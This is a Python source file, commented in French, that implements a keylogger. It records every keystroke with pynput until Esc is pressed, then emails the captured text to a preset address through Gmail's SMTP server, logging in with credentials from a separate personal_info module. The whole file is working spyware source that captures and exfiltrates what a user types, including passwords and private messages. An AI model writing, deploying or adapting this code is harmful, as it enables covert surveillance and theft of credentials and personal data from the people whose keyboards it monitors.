import personal_info
import pynput
import json
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

storage_data = ""

def save_key(key, special):
    global storage_data
    if not special:
        storage_data += key.char
    else:
        if key == "Key.space":
            storage_data += " "
        elif key == "Key.enter":
            storage_data += "\n"
        else:
            storage_data += " " + key + " "

def key_press(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        # Debug terminal 
        # print('alphanumeric key %c pressed' % key.char)
        save_key(key, False)
    else:
        # Debug terminal
        # print('special key {0} pressed'.format(key))
        save_key(str(key), True)

def key_release(key):
    # Debug terminal
    # print('{0} released'.format(key))
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False

def sendEmail(msg):
    Fromadd = personal_info.FROM_EMAIL
    Toadd = personal_info.TOADD_EMAIL
    # cc = [Fromadd, Toadd]    # Spécification des destinataires en copie carbone (cas de plusieurs destinataires)
    # bcc = "ADRESSE MAIL DU 3ème DESTINATAIRE"    # Spécification du destinataire en copie cachée (en copie cachée)
    # Toadds = [Toadd] + cc + [bcc]    # Rassemblement des destinataires
    message = MIMEMultipart()    # Création de l'objet "message"
    message['From'] = Fromadd    # Spécification de l'expéditeur
    message['To'] = Toadd    # Attache du destinataire à l'objet "message"
    # message['CC'] = ",".join(cc)    # Attache des destinataires en copie carbone à l'objet "message" (cas de plusieurs destinataires)
    # message['BCC'] = bcc    # Attache du destinataire en copie cachée à l'objet "message"
    message['Subject'] = "Object"
    message.attach(MIMEText(msg))
    
    serveur = smtplib.SMTP('smtp.gmail.com', 587)    # Connexion au serveur sortant (en précisant son nom et son port)
    serveur.starttls()    # Spécification de la sécurisation
    serveur.login(Fromadd, personal_info.PASSWORD)    # Authentification
    texte = message.as_string().encode('utf-8')    # Conversion de l'objet "message" en chaine de caractère et encodage en UTF-8
    serveur.sendmail(Fromadd, Toadd, texte)    # Envoi du mail
    serveur.quit()    # Déconnexion du serveur

def main():
    # Collect events until released
    listener = pynput.keyboard.Listener(on_press = key_press, on_release = key_release)
    listener.start()
    listener.join()
    sendEmail(storage_data)

if __name__ == "__main__":
    main()